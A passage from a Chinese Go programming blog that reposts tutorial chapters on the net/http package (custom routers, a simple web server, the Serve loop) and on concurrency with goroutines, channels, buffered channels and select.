<p>通过上面这个介绍，我们了解了整个路由过程，Go 其实支持外部实现的路由器 ListenAndServe 的第二个参数就是用以配置外部路由器的，它是一个 Handler 接口，即外部路由器只要实现了 Handler 接口就可以，我们可以在自己实现的路由器的 ServeHTTP 里面实现自定义路由功能。</p>
<p>如下代码所示，我们自己实现了一个简易的路由器</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MyMux <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *MyMux)</span></span> ServeHTTP(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    <span class="keyword">if</span> r.URL.Path == <span class="string">&quot;/&quot;</span> &#123;</span><br><span class="line">        sayhelloName(w, r)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    http.NotFound(w, r)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayhelloName</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    fmt.Fprintf(w, <span class="string">&quot;Hello myroute!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mux := &amp;MyMux&#123;&#125;</span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:9090&quot;</span>, mux)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Go-代码的执行流程"><a href="#Go-代码的执行流程" class="headerlink" title="Go 代码的执行流程"></a>Go 代码的执行流程</h2><p>通过对 http 包的分析之后，现在让我们来梳理一下整个的代码执行过程。</p>
<p>首先调用 Http.HandleFunc</p>
<p>按顺序做了几件事：</p>
<p>1 调用了 DefaultServeMux 的 HandleFunc</p>
<p>2 调用了 DefaultServeMux 的 Handle</p>
<p>3 往 DefaultServeMux 的 map [string] muxEntry 中增加对应的 handler 和路由规则</p>
<p>其次调用 http.ListenAndServe (“:9090”, nil)</p>
<p>按顺序做了几件事情：</p>
<p>1 实例化 Server</p>
<p>2 调用 Server 的 ListenAndServe ()</p>
<p>3 调用 net.Listen (“tcp”, addr) 监听端口</p>
<p>4 启动一个 for 循环，在循环体中 Accept 请求</p>
<p>5 对每个请求实例化一个 Conn，并且开启一个 goroutine 为这个请求进行服务 go c.serve ()</p>
<p>6 读取每个请求的内容 w, err :&#x3D; c.readRequest ()</p>
<p>7 判断 handler 是否为空，如果没有设置 handler（这个例子就没有设置 handler），handler 就设置为 DefaultServeMux</p>
<p>8 调用 handler 的 ServeHttp</p>
<p>9 在这个例子中，下面就进入到 DefaultServeMux.ServeHttp</p>
<p>10 根据 request 选择 handler，并且进入到这个 handler 的 ServeHTTP<br>11 选择 handler：</p>
<p>A 判断是否有路由能满足这个 request（循环遍历 ServeMux 的 muxEntry）</p>
<p>B 如果有路由满足，调用这个路由 handler 的 ServeHTTP</p>
<p>C 如果没有路由满足，调用 NotFoundHandler 的 ServeHTTP</p>
<p>转载文章：<a target="_blank" rel="noopener" href="https://learnku.com/docs/build-web-application-with-golang/034-gos-http-package-detailed-solution/3171">03.4. Go 的 http 包详解 | 第三章. Web 基础 |《Go Web 编程》| Go 技术论坛 (learnku.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/17/6.%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAweb%E6%9C%8D%E5%8A%A1%E5%99%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/17/6.%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAweb%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="post-title-link" itemprop="url">6.搭建一个web服务器</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-17 12:02:18 / 修改时间：12:24:53" itemprop="dateCreated datePublished" datetime="2022-09-17T12:02:18+08:00">2022-09-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Go-web-%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">Go web 编程</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Go-搭建一个-Web-服务器"><a href="#Go-搭建一个-Web-服务器" class="headerlink" title="Go 搭建一个 Web 服务器"></a>Go 搭建一个 Web 服务器</h1><h2 id="http-包建立-Web-服务器"><a href="#http-包建立-Web-服务器" class="headerlink" title="http 包建立 Web 服务器"></a>http 包建立 Web 服务器</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayhelloName</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    r.ParseForm()  <span class="comment">// 解析参数，默认是不会解析的</span></span><br><span class="line">    fmt.Println(r.Form)  <span class="comment">// 这些信息是输出到服务器端的打印信息</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;path&quot;</span>, r.URL.Path)</span><br><span class="line">    fmt.Println(<span class="string">&quot;scheme&quot;</span>, r.URL.Scheme)</span><br><span class="line">    fmt.Println(r.Form[<span class="string">&quot;url_long&quot;</span>])</span><br><span class="line">    <span class="keyword">for</span> k, v := <span class="keyword">range</span> r.Form &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;key:&quot;</span>, k)</span><br><span class="line">        fmt.Println(<span class="string">&quot;val:&quot;</span>, strings.Join(v, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Fprintf(w, <span class="string">&quot;Hello astaxie!&quot;</span>) <span class="comment">// 这个写入到 w 的是输出到客户端的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/&quot;</span>, sayhelloName) <span class="comment">// 设置访问的路由</span></span><br><span class="line">    err := http.ListenAndServe(<span class="string">&quot;:9090&quot;</span>, <span class="literal">nil</span>) <span class="comment">// 设置监听的端口</span></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(<span class="string">&quot;ListenAndServe: &quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这个代码，我们 build 之后，然后执行 web.exe, 这个时候其实已经在 9090 端口监听 http 链接请求了。</p>
<p>在浏览器输入 <a target="_blank" rel="noopener" href="http://localhost:9090/">http://localhost:9090</a></p>
<p>可以看到浏览器页面输出了 Hello astaxie!</p>
<p>可以换一个地址试试：<a target="_blank" rel="noopener" href="http://localhost:9090/?url_long=111&amp;url_long=222">http://localhost:9090/?url_long=111&amp;url_long=222</a></p>
<p>看看浏览器输出的是什么，服务器输出的是什么？</p>
<h2 id="web-工作方式的几个概念"><a href="#web-工作方式的几个概念" class="headerlink" title="web 工作方式的几个概念"></a>web 工作方式的几个概念</h2><p>以下均是服务器端的几个概念</p>
<p>Request：用户请求的信息，用来解析用户的请求信息，包括 post、get、cookie、url 等信息</p>
<p>Response：服务器需要反馈给客户端的信息</p>
<p>Conn：用户的每次请求链接</p>
<p>Handler：处理请求和生成返回信息的处理逻辑</p>
<h2 id="分析-http-包运行机制"><a href="#分析-http-包运行机制" class="headerlink" title="分析 http 包运行机制"></a>分析 http 包运行机制</h2><p>创建 Listen Socket, 监听指定的端口，等待客户端请求到来。</p>
<p>Listen Socket 接受客户端的请求，得到 Client Socket, 接下来通过 Client Socket 与客户端通信。</p>
<p>处理客户端的请求，首先从 Client Socket 读取 HTTP 请求的协议头，如果是 POST 方法，还可能要读取客户端提交的数据，然后交给相应的 handler 处理请求，handler 处理完毕准备好客户端需要的数据，通过 Client Socket 写给客户端。</p>
<p>这整个的过程里面我们只要了解清楚下面三个问题，也就知道 Go 是如何让 Web 运行起来了</p>
<p>如何监听端口？<br>如何接收客户端请求？<br>如何分配 handler？<br>前面小节的代码里面我们可以看到，Go 是通过一个函数 ListenAndServe 来处理这些事情的，这个底层其实这样处理的：初始化一个 server 对象，然后调用了 net.Listen(“tcp”, addr)，也就是底层用 TCP 协议搭建了一个服务，然后监控我们设置的端口。</p>
<p>下面代码来自 Go 的 http 包的源码，通过下面的代码我们可以看到整个的 http 处理过程：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(srv *Server)</span></span> Serve(l net.Listener) <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> l.Close()</span><br><span class="line">    <span class="keyword">var</span> tempDelay time.Duration <span class="comment">// how long to sleep on accept failure</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        rw, e := l.Accept()</span><br><span class="line">        <span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ne, ok := e.(net.Error); ok &amp;&amp; ne.Temporary() &#123;</span><br><span class="line">                <span class="keyword">if</span> tempDelay == <span class="number">0</span> &#123;</span><br><span class="line">                    tempDelay = <span class="number">5</span> * time.Millisecond</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    tempDelay *= <span class="number">2</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> max := <span class="number">1</span> * time.Second; tempDelay &gt; max &#123;</span><br><span class="line">                    tempDelay = max</span><br><span class="line">                &#125;</span><br><span class="line">                log.Printf(<span class="string">&quot;http: Accept error: %v; retrying in %v&quot;</span>, e, tempDelay)</span><br><span class="line">                time.Sleep(tempDelay)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> e</span><br><span class="line">        &#125;</span><br><span class="line">        tempDelay = <span class="number">0</span></span><br><span class="line">        c, err := srv.newConn(rw)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">go</span> c.serve()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>监控之后如何接收客户端的请求呢？上面代码执行监控端口之后，调用了 srv.Serve(net.Listener) 函数，这个函数就是处理接收客户端的请求信息。这个函数里面起了一个 for{}，首先通过 Listener 接收请求，其次创建一个 Conn，最后单独开了一个 goroutine，把这个请求的数据当做参数扔给这个 conn 去服务：go c.serve()。这个就是高并发体现了，用户的每一次请求都是在一个新的 goroutine 去服务，相互不影响。</p>
<p>那么如何具体分配到相应的函数来处理请求呢？conn 首先会解析 request:c.readRequest(), 然后获取相应的 handler:handler :&#x3D; c.server.Handler，也就是我们刚才在调用函数 ListenAndServe 时候的第二个参数，我们前面例子传递的是 nil，也就是为空，那么默认获取 handler &#x3D; DefaultServeMux, 那么这个变量用来做什么的呢？对，这个变量就是一个路由器，它用来匹配 url 跳转到其相应的 handle 函数，那么这个我们有设置过吗？有，我们调用的代码里面第一句不是调用了 http.HandleFunc(“&#x2F;“, sayhelloName) 嘛。这个作用就是注册了请求 &#x2F; 的路由规则，当请求 uri 为 “&#x2F;“，路由就会转到函数 sayhelloName，DefaultServeMux 会调用 ServeHTTP 方法，这个方法内部其实就是调用 sayhelloName 本身，最后通过写入 response 的信息反馈到客户端。</p>
<p>转载文章：<a target="_blank" rel="noopener" href="https://learnku.com/docs/build-web-application-with-golang/how-033-go-makes-web-work/3170">03.3. Go 如何使得 Web 工作 | 第三章. Web 基础 |《Go Web 编程》| Go 技术论坛 (learnku.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/16/5.%E5%B9%B6%E5%8F%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/16/5.%E5%B9%B6%E5%8F%91/" class="post-title-link" itemprop="url">5.并发</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-16 10:32:38 / 修改时间：10:57:49" itemprop="dateCreated datePublished" datetime="2022-09-16T10:32:38+08:00">2022-09-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Go-web-%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">Go web 编程</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h1><p>有人把 Go 比作 21 世纪的 C 语言，第一是因为 Go 语言设计简单，第二，21 世纪最重要的就是并行程序设计，而 Go 从语言层面就支持了并行。</p>
<h2 id="goroutine"><a href="#goroutine" class="headerlink" title="goroutine"></a>goroutine</h2><p>goroutine 是 Go 并行设计的核心。goroutine 说到底其实就是协程，但是它比线程更小，十几个 goroutine 可能体现在底层就是五六个线程，Go 语言内部帮你实现了这些 goroutine 之间的内存共享。执行 goroutine 只需极少的栈内存 (大概是 4~5 KB)，当然会根据相应的数据伸缩。也正因为如此，可同时运行成千上万个并发任务。goroutine 比 thread 更易用、更高效、更轻便。</p>
<p>goroutine 是通过 Go 的 runtime 管理的一个线程管理器。goroutine 通过 go 关键字实现了，其实就是一个普通的函数。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> hello(a, b, c)</span><br></pre></td></tr></table></figure>

<p>通过关键字 go 就启动了一个 goroutine。我们来看一个例子</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(s <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        runtime.Gosched()</span><br><span class="line">        fmt.Println(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> say(<span class="string">&quot;world&quot;</span>) <span class="comment">// 开一个新的 Goroutines 执行</span></span><br><span class="line">    say(<span class="string">&quot;hello&quot;</span>) <span class="comment">// 当前 Goroutines 执行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上程序执行后将输出：</span></span><br><span class="line"><span class="comment">// hello</span></span><br><span class="line"><span class="comment">// world</span></span><br><span class="line"><span class="comment">// hello</span></span><br><span class="line"><span class="comment">// world</span></span><br><span class="line"><span class="comment">// hello</span></span><br><span class="line"><span class="comment">// world</span></span><br><span class="line"><span class="comment">// hello</span></span><br><span class="line"><span class="comment">// world</span></span><br><span class="line"><span class="comment">// hello</span></span><br><span class="line"><span class="comment">// world</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到 go 关键字很方便的就实现了并发编程。<br>上面的多个 goroutine 运行在同一个进程里面，共享内存数据，不过设计上我们要遵循：不要通过共享来通信，而要通过通信来共享。</p>
<h2 id="channels"><a href="#channels" class="headerlink" title="channels"></a>channels</h2><p>goroutine 运行在相同的地址空间，因此访问共享内存必须做好同步。那么 goroutine 之间如何进行数据的通信呢，Go 提供了一个很好的通信机制 channel。channel 可以与 Unix shell 中的双向管道做类比：可以通过它发送或者接收值。这些值只能是特定的类型： channel 类型。定义一个 channel 时，也需要定义发送到 channel 的值的类型。注意，必须使用 make 创建 channel：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ci := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">cs := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">cf := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">interface</span>&#123;&#125;)</span><br></pre></td></tr></table></figure>

<p>channel 通过操作符 <code>&lt;-</code> 来接收和发送数据</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ch &lt;- v    <span class="comment">// 发送 v 到 channel ch.</span></span><br><span class="line">v := &lt;-ch  <span class="comment">// 从 ch 中接收数据，并赋值给v</span></span><br></pre></td></tr></table></figure>

<p>我们把这些应用到我们的例子中来：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(a []<span class="type">int</span>, c <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    total := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, v := <span class="keyword">range</span> a &#123;</span><br><span class="line">        total += v</span><br><span class="line">    &#125;</span><br><span class="line">    c &lt;- total  <span class="comment">// send total to c</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := []<span class="type">int</span>&#123;<span class="number">7</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">-9</span>, <span class="number">4</span>, <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">    <span class="keyword">go</span> sum(a[:<span class="built_in">len</span>(a)/<span class="number">2</span>], c)</span><br><span class="line">    <span class="keyword">go</span> sum(a[<span class="built_in">len</span>(a)/<span class="number">2</span>:], c)</span><br><span class="line">    x, y := &lt;-c, &lt;-c  <span class="comment">// receive from c</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(x, y, x + y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认情况下，channel 接收和发送数据都是阻塞的，除非另一端已经准备好，这样就使得 Goroutines 同步变的更加的简单，而不需要显式的 lock。所谓阻塞，也就是如果读取（value :&#x3D; &lt;-ch）它将会被阻塞，直到有数据接收。其次，任何发送（ch&lt;-5）将会被阻塞，直到数据被读出。无缓冲 channel 是在多个 goroutine 之间同步很棒的工具。</p>
<h2 id="Buffered-Channels"><a href="#Buffered-Channels" class="headerlink" title="Buffered Channels"></a>Buffered Channels</h2><p>上面我们介绍了默认的非缓存类型的 channel，不过 Go 也允许指定 channel 的缓冲大小，很简单，就是 channel 可以存储多少元素。ch:&#x3D; make (chan bool, 4)，创建了可以存储 4 个元素的 bool 型 channel。在这个 channel 中，前 4 个元素可以无阻塞的写入。当写入第 5 个元素时，代码将会阻塞，直到其他 goroutine 从 channel 中读取一些元素，腾出空间。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">type</span>, value)</span><br></pre></td></tr></table></figure>

<p>当 value &#x3D; 0 时，channel 是无缓冲阻塞读写的，当 value &gt; 0 时，channel 有缓冲、是非阻塞的，直到写满 value 个元素才阻塞写入。</p>
<p>我们看一下下面这个例子，你可以在自己本机测试一下，修改相应的 value 值</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">2</span>) <span class="comment">// 修改 2 为 1 就报错，修改 2 为 3 可以正常运行</span></span><br><span class="line">    c &lt;- <span class="number">1</span></span><br><span class="line">    c &lt;- <span class="number">2</span></span><br><span class="line">    fmt.Println(&lt;-c)</span><br><span class="line">    fmt.Println(&lt;-c)</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 修改为 1 报如下的错误:</span></span><br><span class="line">        <span class="comment">// fatal error: all goroutines are asleep - deadlock!</span></span><br></pre></td></tr></table></figure>

<h2 id="Range-和-Close"><a href="#Range-和-Close" class="headerlink" title="Range 和 Close"></a>Range 和 Close</h2><p>上面这个例子中，我们需要读取两次 c，这样不是很方便，Go 考虑到了这一点，所以也可以通过 range，像操作 slice 或者 map 一样操作缓存类型的 channel，请看下面的例子</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonacci</span><span class="params">(n <span class="type">int</span>, c <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    x, y := <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        c &lt;- x</span><br><span class="line">        x, y = y, x + y</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">go</span> fibonacci(<span class="built_in">cap</span>(c), c)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> c &#123;</span><br><span class="line">        fmt.Println(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>for i :&#x3D; range c 能够不断的读取 channel 里面的数据，直到该 channel 被显式的关闭。上面代码我们看到可以显式的关闭 channel，生产者通过内置函数 close 关闭 channel。关闭 channel 之后就无法再发送任何数据了，在消费方可以通过语法 v, ok :&#x3D; &lt;-ch 测试 channel 是否被关闭。如果 ok 返回 false，那么说明 channel 已经没有任何数据并且已经被关闭。</p>
<h2 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h2><p>我们上面介绍的都是只有一个 channel 的情况，那么如果存在多个 channel 的时候，我们该如何操作呢，Go 里面提供了一个关键字 select，通过 select 可以监听 channel 上的数据流动。</p>
<p>select 默认是阻塞的，只有当监听的 channel 中有发送或接收可以进行时才会运行，当多个 channel 都准备好的时候，select 是随机的选择一个执行的。</p>
